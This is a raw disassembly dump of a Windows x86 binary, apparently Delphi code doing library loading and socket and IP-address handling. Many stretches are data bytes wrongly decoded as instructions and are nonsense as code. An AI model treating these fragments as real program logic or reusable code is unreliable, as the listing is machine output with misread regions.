mov [ fs : eax ] edx
push sub_457848
retn
sub_4578cc
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_45796c
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebx + 0x14 ]
mov edx edi
call sub_403f08
mov [ ebx + 0xc ] esi
test esi esi
jne r-xdata
add esp 0xfffffff0
call sub_403404
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_40ab24
mov edx [ ebp - 0x8 ]
lea eax [ ebx + 0x10 ]
call sub_403f08
push edi
push r-xdata
push [ ebx + 0x10 ]
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_404234
mov ecx [ ebp - 0xc ]
xor edx edx
mov eax ebx
call sub_40b32c
mov ecx edi
xor edx edx
mov eax ebx
call sub_40b32c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457973
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_403ed8
retn
sub_457973
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
sub_458750
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor edx edx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] edx
xor edx edx
push ebp
push sub_4587f3
push [ fs : edx ]
mov [ fs : edx ] esp
lea eax [ eax + eax * 2 ]
lea ebx [ eax * 4 + rw-data ]
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ rw-data ]
push eax
call GetProcAddress
mov esi eax
mov eax [ ebx + 0x4 ]
mov [ eax ] esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4587fa
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403ed8
retn
push 0x276d
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_4059b4
mov eax [ ebp - 0x8 ]
mov edx [ ebx + 0x8 ]
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] 0x6
lea edx [ ebp - 0x10 ]
xor ecx ecx
call sub_408aac
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4578cc
call sub_40386c
sub_458804
push ebx
xor eax eax
mov [ rw-data ] eax
mov ecx 0x70
mov eax rw-data
mov edx eax
mov ebx [ edx + 0x4 ]
mov edx [ edx ]
mov [ ebx ] edx
add eax 0xc
dec ecx
jne r-xdata
pop ebx
retn
sub_458828
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4588f5
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
push r-xdata
call LoadLibraryA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
mov eax [ ebp + 0xc ]
push eax
mov ax [ ebp + 0x8 ]
push eax
call [ rw-data ]
mov ebx eax
jmp r-xdata
call GetLastError
push eax
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_4059b4
mov eax [ ebp - 0x8 ]
push eax
mov eax r-xdata
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x10 ]
xor ecx ecx
pop eax
call sub_408aac
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4578cc
call sub_40386c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4588fc
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403ed8
retn
sub_458933
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_458960
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458967
retn
call sub_4579a4
sub_45897c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4589a1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4589a8
retn
sub_458a2d
mov al [ ebp ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add cl [ ebx + 0x100045 ]
add [ eax ] al
mov al [ 0x28004010 ]
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] bh
xor eax [ eax ]
cmp al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
nop
xor [ eax ] al
lodsb [ esi ]
xor [ eax ] al
or al 0x93
inc ebp
add [ ecx + ebp ] ch
inc eax
add [ ecx + ebp ] ch
inc eax
add [ ecx + ebp ] ch
inc eax
add [ eax - 0x73 ] bl
inc ebp
add [ ecx + ebp ] ch
inc eax
add [ ecx + ebp ] ch
inc eax
add [ ecx + ebp ] ch
inc eax
add [ ecx + ebp ] ch
inc eax
add [ ecx + ebp ] ch
inc eax
add [ ecx + ebp ] ch
inc eax
add [ ecx + ebp ] ch
inc eax
add [ ecx + ebp ] ch
inc eax
add [ ecx + ebp ] ch
inc eax
add [ ecx + ebp ] ch
inc eax
add [ ecx + ebp ] ch
inc eax
add [ ecx + ebp ] ch
inc eax
add [ ecx + ebp ] ch
inc eax
add [ ecx + ebp ] ch
inc eax
add [ ecx + ebp ] ch
inc eax
add [ ecx + ebp ] ch
inc eax
add [ ecx + ebp ] ch
inc eax
add [ ecx + ebp ] ch
inc eax
add [ ecx + ebp ] ch
inc eax
add [ ecx + ebp ] ch
inc eax
add [ ecx + ebp ] ch
inc eax
add [ ecx + ebp ] ch
inc eax
add ah bh
lea eax [ ebp ]
sub al 0x29
inc eax
add [ ecx + ebp ] ch
inc eax
add [ ecx + ebp ] ch
inc eax
add [ ecx + ebp ] ch
inc eax
add [ ecx + ebp ] ch
inc eax
add [ ecx + ebp ] ch
inc eax
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x80040 ] dl
inc ebp
add [ eax ] al
add [ eax ] al
arpl [ ebx - 0x70 ] bp
pop eax
mov eax [ ebp ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop eax
mov eax [ ebp ]
or al 0x0
add [ eax ] al
adc [ ebx + 0x45 ] ch
add [ eax ] ch
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] bh
xor eax [ eax ]
cmp al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
nop
xor [ eax ] al
lodsb [ esi ]
xor [ eax ] al
call 0xd45cb89
inc ebp
dec ecx
push ebx
je r-xdata
call 0x1745cc51
inc ebp
dec ecx
push ebx
je r-xdata
arpl [ ebx + 0x49 ] bp
outsb
imul esi [ ecx + ebp * 2 + 0x61 ] 0x617a696c
je r-xdata
je r-xdata
arpl [ ebx + 0x45 ] bp
jb r-xdata
retn 0x4
arpl [ ebx + 0x53 ] bp
je r-xdata
arpl [ ebp + 0x65 ] sp
push 0xffffffff
outsd
outsb
je r-xdata
inc esi
popad
imul ebp [ ebp + 0x64 ] 0x2000408d
mov [ ebp ] es
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ ebp + eax * 2 + 0xc00 ] cl
add [ ebx + ecx * 4 ] cl
popad
insb
imul edi [ edx + 0x61 ] 0x6e6f6974
inc ebp
add [ eax ] ch
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] bh
xor eax [ eax ]
cmp al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
nop
xor [ eax ] al
lodsb [ esi ]
xor [ eax ] al
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
mov [ ebp ] es
or al 0x0
add [ eax ] al
or al 0x8b
outsd
jb r-xdata
add [ eax ] al
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
lea ecx [ esp + 0x4 ]
call sub_458c44
retn
imul edi [ edx + 0x65 ] 0x65637845
push 0xffffffff
add [ eax ] al
or [ ecx + ecx * 2 + 0x64 ] dl
push ebx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
xchg esp eax
adc [ eax ] al
or [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ecx * 4 + 0xc0045 ] dh
add [ eax ] al
or al 0x8b
inc ebp
add [ eax ] ch
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] bh
xor eax [ eax ]
cmp al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
nop
xor [ eax ] al
lodsb [ esi ]
xor [ eax ] al
call 0x1c45cbe5
inc ebp
dec ecx
push ebx
je r-xdata
shl [ ebx + ecx * 4 + 0x45 ] 0x0
sub_458c44
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi eax
xor ebx ebx
inc edx
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0x6c ]
mov [ esi + 0x4 ] eax
mov edx [ ebp + 0x8 ]
test edx edx
jl r-xdata
mov edx [ esi + 0x4 ]
mov eax esi
call sub_458cf8
inc edx
mov eax edi
add eax 0x4
dec edx
jne r-xdata
mov bl 0x1
jmp r-xdata
mov ecx [ esi + 0x4 ]
cmp ecx [ eax ]
jne r-xdata
sub_458c8c
push ebp
mov ebp esp
push 0x0
push ebx
xor ebx ebx
push ebp
push sub_458ceb
push [ fs : ebx ]
mov [ fs : ebx ] esp
push ecx
mov ecx 0x2
xchg edx ecx
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458cf2
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4059b4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b32c
call sub_40386c
sub_458cf8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_458d4a
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x68 ]
mov eax [ ebp - 0x4 ]
push eax
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_4574f4
call sub_40386c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458d51
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
sub_458d84
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov edx r-xdata
mov eax ebx
call sub_407b48
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_459230
test al al
je r-xdata
mov eax edi
mov edx r-xdata
call sub_403f08
jmp r-xdata
mov ecx edi
mov edx ebx
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov eax edi
mov edx ebx
call sub_403f08
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_458dfc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ebx
mov ebx ecx
mov esi edx
xor eax eax
push ebp
push sub_4591f6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_403eb4
mov eax esi
add eax 0xffffd8ec
cmp eax 0x3e
ja r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_4059b4
mov eax [ ebp - 0x8 ]
push eax
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x14 ] 0x0
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
pop eax
call sub_408aac
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_403f08
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4591fd
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403ed8
retn
jmp [ eax * 4 + jump_table_458e3c ]
mov edx ebx
mov eax [ rw-data ]
call sub_4059b4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059b4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059b4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059b4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059b4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059b4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059b4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059b4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059b4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059b4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059b4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059b4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059b4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059b4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059b4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059b4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059b4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059b4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059b4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059b4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059b4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059b4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059b4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059b4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059b4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059b4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059b4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059b4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059b4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059b4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059b4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059b4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059b4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059b4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059b4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059b4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059b4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059b4
sub_459204
push ebx
mov ebx eax
or edx 0xffffffff
mov eax ebx
call sub_407f60
inc eax
jle r-xdata
xor eax eax
pop ebx
retn
mov edx 0x100
mov eax ebx
call sub_407f60
cmp eax 0x100
jl r-xdata
mov al 0x1
pop ebx
retn
sub_459230
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x4 ]
call sub_404364
xor eax eax
push ebp
push sub_4592ef
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_45a898
push 0x1
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_45a898
push 0x1
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_45a898
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
call sub_403f4c
mov eax [ ebp - 0x8 ]
call sub_459204
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_459204
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4592f6
lea eax [ ebp - 0x14 ]
mov edx 0x5
call sub_403ed8
retn
mov eax [ ebp - 0x10 ]
call sub_459204
test al al
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_459204
test al al
jne r-xdata
mov bl 0x1
sub_45930c
push ebx
push esi
call sub_40346c
mov ebx edx
mov esi eax
mov eax [ esi + 0xc ]
call sub_4030f8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4030e8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403454
sub_45933c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_404364
xor eax eax
push ebp
push sub_459384
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x80 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45938b
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
sub_459394
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4593b9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4593c0
retn
sub_459444
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ ebp + 0x100045 ] dl
add [ eax ] al
and [ edx + 0x33280045 ] cl
inc eax
add [ ebx + esi ] dh
inc eax
add [ eax ] bh
xor eax [ eax ]
cmp al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
nop
xor [ eax ] al
lodsb [ esi ]
xor [ eax ] al
in al 0x95
inc ebp
add al ch
sahf
inc ebp
add [ eax + 0x6000459f ] dl
pushfd
inc ebp
add [ eax ] ah
xchg ebp eax
inc ebp
add [ esi + edx * 4 - 0x68b3ffbb ] bh
inc ebp
add [ eax - 0x3bffba69 ] bh
xchg edi eax
inc ebp
add [ eax + ebx * 4 ] dl
inc ebp
add al al
cwde
inc ebp
add [ eax - 0x68 ] dh
inc ebp
add al al
pushfd
inc ebp
add al cl
popfd
inc ebp
add [ eax - 0x3ffba64 ] ch
cwde
inc ebp
add [ esp + ebx * 4 - 0x612fffbb ] dh
inc ebp
add ah bl
sahf
inc ebp
add [ eax ] cl
cdq
inc ebp
add [ ecx + ebx * 4 ] ah
inc ebp
add [ eax - 0x47ffba66 ] ah
fwait
inc ebp
add ah dl
fwait
inc ebp
add [ eax - 0x64 ] al
inc ebp
add [ eax + 0x5000459c ] dl
mov eax [ 0xffffffffa3c00045 ]
inc ebp
add [ esp + ebx * 4 - 0x5ea3ffbb ] al
inc ebp
add ah bh
mov eax [ 0xffffffffa29c0045 ]
inc ebp
add [ esi + edx * 4 ] cl
inc ebp
add [ eax + 0x45 ] dh
add [ edi ] cl
push esp
dec ecx
push ebx
je r-xdata
xchg ebp eax
insb
arpl [ ebx + 0x57 ] bp
imul ebp [ esi + 0x64 ] 0x5573776f
mov ebp esp
add esp 0xfffffe6c
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x194 ] ecx
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4595be
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_458d58
cmp [ rw-data ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_403404
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4595c5
lea eax [ ebp - 0x18e ]
push eax
push 0x202
call sub_458828
inc eax
jne r-xdata
mov [ rw-data ] 0x1
lea edx [ ebp - 0x194 ]
mov eax [ rw-data ]
call sub_4059b4
mov ecx [ ebp - 0x194 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b32c
call sub_40386c
sub_4595e4
push ebx
push esi
call sub_40346c
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_45930c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403454
sub_45960c
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi ecx
mov ebx edx
xor eax eax
push ebp
push sub_4596a0
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov al [ ebx ]
lea edx [ ebp - 0x4 ]
call sub_407de8
push [ ebp - 0x4 ]
push r-xdata
xor eax eax
mov al [ ebx + 0x1 ]
lea edx [ ebp - 0x8 ]
call sub_407de8
push [ ebp - 0x8 ]
push r-xdata
xor eax eax
mov al [ ebx + 0x2 ]
lea edx [ ebp - 0xc ]
call sub_407de8
push [ ebp - 0xc ]
push r-xdata
xor eax eax
mov al [ ebx + 0x3 ]
lea edx [ ebp - 0x10 ]
call sub_407de8
push [ ebp - 0x10 ]
mov eax esi
mov edx 0x7
call sub_404234
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4596a7
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403ed8
retn
sub_4596b3
inc [ ecx ]
add [ eax ] al
add [ esi ] ch
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xffffffe4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x4 ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_45973b
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] 0x10
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov esi eax
lea ecx [ ebp - 0x1c ]
lea edx [ ebp - 0x14 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x7c ]
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_403f08
mov ax [ ebp - 0x16 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_459742
lea eax [ ebp - 0x1c ]
call sub_403eb4
retn
sub_45974c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0xc ]
mov ax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] ax
mov eax esi
call sub_404174
test eax eax
jne r-xdata
mov edx esi
mov eax ebx
call sub_45933c
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x10 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov ax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x12 ] ax
push 0x10
lea eax [ ebp - 0x14 ]
push eax
push edi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4597c4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebp - 0x10 ] cx
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_45933c
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0xc ] eax
mov ax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0xe ] ax
push 0x10
lea eax [ ebp - 0x10 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_459814
push ebx
push esi
push edi
push ecx
mov esi ecx
mov edi edx
mov ebx eax
mov eax edi
call sub_404374
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
mov eax [ eax + 0xc ]
mov eax [ eax ]
mov dl [ eax ]
mov [ esp ] dl
mov dl [ eax + 0x1 ]
mov [ esp + 0x1 ] dl
mov dl [ eax + 0x2 ]
mov [ esp + 0x2 ] dl
mov al [ eax + 0x3 ]
mov [ esp + 0x3 ] al
mov ecx esi
mov edx esp
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x7c ]
or edx 0xffffffff
mov eax ebx
call sub_458c38
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_459870
push ebx
push esi
push edi
push ecx
mov edi ecx
mov ebx edx
mov esi eax
mov eax ebx
call sub_404374
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ esp ] eax
push 0x2
push 0x4
lea eax [ esp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
test ebx ebx
jne r-xdata
mov eax edi
mov edx [ ebx ]
call sub_4040ac
or edx 0xffffffff
mov eax esi
call sub_458c38
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_4598c0
push ebx
mov ebx edx
mov eax ebx
mov edx 0xfa
call sub_404500
mov eax [ ebx ]
call sub_404174
push eax
mov eax [ ebx ]
call sub_404374
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebx ]
call sub_404374
mov edx eax
mov eax ebx
call sub_4040ac
pop ebx
retn
sub_459908
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push ecx
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ebp
retn 0x8
sub_459924
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x4 ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_4599af
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] 0x10
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov esi eax
lea ecx [ ebp - 0x1c ]
lea edx [ ebp - 0x14 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x7c ]
mov edx [ ebp - 0x1c ]
mov eax [ ebp + 0xc ]
call sub_403f08
mov ax [ ebp - 0x16 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4599b6
lea eax [ ebp - 0x1c ]
call sub_403eb4
retn
sub_4599c0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx [ eax ]
call [ edx + 0x8 ]
mov edx [ ebx ]
mov eax edi
call sub_413bb0
mov esi [ ebx ]
dec esi
test esi esi
jl r-xdata
inc esi
lea eax [ ebx + 0x4 ]
mov ebx eax
mov edx [ ebx ]
mov eax edi
call sub_413898
add ebx 0x4
dec esi
jne r-xdata
sub_4599fc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_459a91
push [ fs : eax ]
mov [ fs : eax ] esp
test edi edi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_459a98
lea eax [ ebp - 0xc ]
call sub_403eb4
retn
cmp [ edi + 0x8 ] 0x40
jle r-xdata
mov esi [ edi + 0x8 ]
dec esi
test esi esi
jl r-xdata
